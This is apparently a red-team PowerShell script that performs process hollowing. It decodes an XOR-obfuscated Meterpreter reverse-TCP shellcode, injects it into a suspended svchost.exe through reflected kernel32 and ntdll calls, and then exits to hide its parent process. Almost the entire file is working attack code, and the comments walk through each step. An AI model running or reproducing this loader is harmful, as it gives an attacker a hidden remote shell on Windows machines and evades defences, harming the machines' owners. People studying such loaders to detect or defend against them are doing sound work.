# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f csharp EXITFUNC=thread
[Byte[]] $SHELLCODE =0x06,0xB2,0x79,0x1E,0x0A,0x12,0x36,0xFA,0xFA,0xFA,0xBB,0xAB,0xBB,0xAA,0xA8,0xB2,0xCB,0x28,0x9F,0xB2,0x71,0xA8,0x9A,0xAB,0xAC,0xB2,0x71,0xA8,0xE2,0xB2,0x71,0xA8,0xDA,0xB2,0x71,0x88,0xAA,0xB2,0xF5,0x4D,0xB0,0xB0,0xB7,0xCB,0x33,0xB2,0xCB,0x3A,0x56,0xC6,0x9B,0x86,0xF8,0xD6,0xDA,0xBB,0x3B,0x33,0xF7,0xBB,0xFB,0x3B,0x18,0x17,0xA8,0xBB,0xAB,0xB2,0x71,0xA8,0xDA,0x71,0xB8,0xC6,0xB2,0xFB,0x2A,0x9C,0x7B,0x82,0xE2,0xF1,0xF8,0xF5,0x7F,0x88,0xFA,0xFA,0xFA,0x71,0x7A,0x72,0xFA,0xFA,0xFA,0xB2,0x7F,0x3A,0x8E,0x9D,0xB2,0xFB,0x2A,0x71,0xB2,0xE2,0xAA,0xBE,0x71,0xBA,0xDA,0xB3,0xFB,0x2A,0x19,0xAC,0xB7,0xCB,0x33,0xB2,0x05,0x33,0xBB,0x71,0xCE,0x72,0xB2,0xFB,0x2C,0xB2,0xCB,0x3A,0x56,0xBB,0x3B,0x33,0xF7,0xBB,0xFB,0x3B,0xC2,0x1A,0x8F,0x0B,0xB6,0xF9,0xB6,0xDE,0xF2,0xBF,0xC3,0x2B,0x8F,0x22,0xA2,0xBE,0x71,0xBA,0xDE,0xB3,0xFB,0x2A,0x9C,0xBB,0x71,0xF6,0xB2,0xBE,0x71,0xBA,0xE6,0xB3,0xFB,0x2A,0xBB,0x71,0xFE,0x72,0xB2,0xFB,0x2A,0xBB,0xA2,0xBB,0xA2,0xA4,0xA3,0xA0,0xBB,0xA2,0xBB,0xA3,0xBB,0xA0,0xB2,0x79,0x16,0xDA,0xBB,0xA8,0x05,0x1A,0xA2,0xBB,0xA3,0xA0,0xB2,0x71,0xE8,0x13,0xB1,0x05,0x05,0x05,0xA7,0xB3,0x44,0x8D,0x89,0xC8,0xA5,0xC9,0xC8,0xFA,0xFA,0xBB,0xAC,0xB3,0x73,0x1C,0xB2,0x7B,0x16,0x5A,0xFB,0xFA,0xFA,0xB3,0x73,0x1F,0xB3,0x46,0xF8,0xFA,0xFB,0x41,0x3A,0x52,0xC8,0x6B,0xBB,0xAE,0xB3,0x73,0x1E,0xB6,0x73,0x0B,0xBB,0x40,0xB6,0x8D,0xDC,0xFD,0x05,0x2F,0xB6,0x73,0x10,0x92,0xFB,0xFB,0xFA,0xFA,0xA3,0xBB,0x40,0xD3,0x7A,0x91,0xFA,0x05,0x2F,0x90,0xF0,0xBB,0xA4,0xAA,0xAA,0xB7,0xCB,0x33,0xB7,0xCB,0x3A,0xB2,0x05,0x3A,0xB2,0x73,0x38,0xB2,0x05,0x3A,0xB2,0x73,0x3B,0xBB,0x40,0x10,0xF5,0x25,0x1A,0x05,0x2F,0xB2,0x73,0x3D,0x90,0xEA,0xBB,0xA2,0xB6,0x73,0x18,0xB2,0x73,0x03,0xBB,0x40,0x63,0x5F,0x8E,0x9B,0x05,0x2F,0x7F,0x3A,0x8E,0xF0,0xB3,0x05,0x34,0x8F,0x1F,0x12,0x69,0xFA,0xFA,0xFA,0xB2,0x79,0x16,0xEA,0xB2,0x73,0x18,0xB7,0xCB,0x33,0x90,0xFE,0xBB,0xA2,0xB2,0x73,0x03,0xBB,0x40,0xF8,0x23,0x32,0xA5,0x05,0x2F,0x79,0x02,0xFA,0x84,0xAF,0xB2,0x79,0x3E,0xDA,0xA4,0x73,0x0C,0x90,0xBA,0xBB,0xA3,0x92,0xFA,0xEA,0xFA,0xFA,0xBB,0xA2,0xB2,0x73,0x08,0xB2,0xCB,0x33,0xBB,0x40,0xA2,0x5E,0xA9,0x1F,0x05,0x2F,0xB2,0x73,0x39,0xB3,0x73,0x3D,0xB7,0xCB,0x33,0xB3,0x73,0x0A,0xB2,0x73,0x20,0xB2,0x73,0x03,0xBB,0x40,0xF8,0x23,0x32,0xA5,0x05,0x2F,0x79,0x02,0xFA,0x87,0xD2,0xA2,0xBB,0xAD,0xA3,0x92,0xFA,0xBA,0xFA,0xFA,0xBB,0xA2,0x90,0xFA,0xA0,0xBB,0x40,0xF1,0xD5,0xF5,0xCA,0x05,0x2F,0xAD,0xA3,0xBB,0x40,0x8F,0x94,0xB7,0x9B,0x05,0x2F,0xB3,0x05,0x34,0x13,0xC6,0x05,0x05,0x05,0xB2,0xFB,0x39,0xB2,0xD3,0x3C,0xB2,0x7F,0x0C,0x8F,0x4E,0xBB,0x05,0x1D,0xA2,0x90,0xFA,0xA3,0x41,0x1A,0xE7,0xD0,0xF0,0xBB,0x73,0x20,0x05,0x2F

$key = 0xfa

# Decoding routine
for ($i = 0; $i -lt $SHELLCODE.Length; $i++) {
    $SHELLCODE[$i] = $SHELLCODE[$i] -bxor $key
}

filter Get-Type ([string]$dllName,[string]$typeName)
{
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
    {
        $_.GetType($typeName)
    }
}

function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}

# Obtain the required types via reflection
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'

# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

# Obtain the function addresses of the required hollowing functions
$ResumeThreadAddr = Get-Function "kernel32.dll" "ResumeThread"
$ReadProcessMemoryAddr = Get-Function "kernel32.dll" "ReadProcessMemory"
$WriteProcessMemoryAddr = Get-Function "kernel32.dll" "WriteProcessMemory"
$ZwQueryInformationProcessAddr = Get-Function "ntdll.dll" "ZwQueryInformationProcess"

# Create the delegate types to call the previously obtain function addresses
$ResumeThread = Get-Delegate $ResumeThreadAddr @([IntPtr])
$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
$ReadProcessMemory = Get-Delegate $ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])
$ZwQueryInformationProcess = Get-Delegate $ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])

# Instantiate the required structures for CreateProcess and use them to launch svchost.exe
$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))

# Obtain the required handles from the PROCESS_INFORMATION structure
$hThread = $processInformation.hThread
$hProcess = $processInformation.hProcess

# Create a buffer to hold the PROCESS_BASIC_INFORMATION structure and call ZwQueryInformationProcess
$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, 0)

# Locate the image base address. The address of the PEB is the second element within the PROCESS_BASIC_INFORMATION
# structure (e.g. offset 0x08 within the $processBasicInformation buffer on x64). Within the PEB, the base image
# addr is located at offset 0x10.
$imageBaseAddrPEB = ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation, 0x08) + 0x10))

# Use ReadProcessMemory to read the required part of the PEB. We allocate already a buffer for 0x200
# bytes that we will use later on. From the PEB we actually only need 0x08 bytes, as $imageBaseAddrPEB
# already points to the correct memory location. We parse the obtained 0x08 bytes as Int64 and IntPtr.
$memoryBuffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0)

$imageBaseAddr = [BitConverter]::ToInt64($memoryBuffer, 0)
$imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr)

# Now that we have the base address, we can read the first 0x200 bytes to obtain the PE file format header.
# The offset of the PE header is at 0x3c within the PE file format header. Within the PE header, the relative
# entry point address can be found at an offset of 0x28. We combine this with the $imageBaseAddr and have finally
# found the non relative entry point address.
$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0)

$peOffset = [BitConverter]::ToUInt32($memoryBuffer, 0x3c)                               # PE header offset
$entryPointAddrRelative = [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28)     # Relative entrypoint
$entryPointAddr = [IntPtr]::new($imageBaseAddr + $entryPointAddrRelative)               # Absolute entrypoint

# Overwrite the entrypoint with shellcode and resume the thread.
$WriteProcessMemory.Invoke($hProcess, $entryPointAddr, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)
$ResumeThread.Invoke($hThread)

# Close powershell to remove it as the parent of svchost.exe
exit
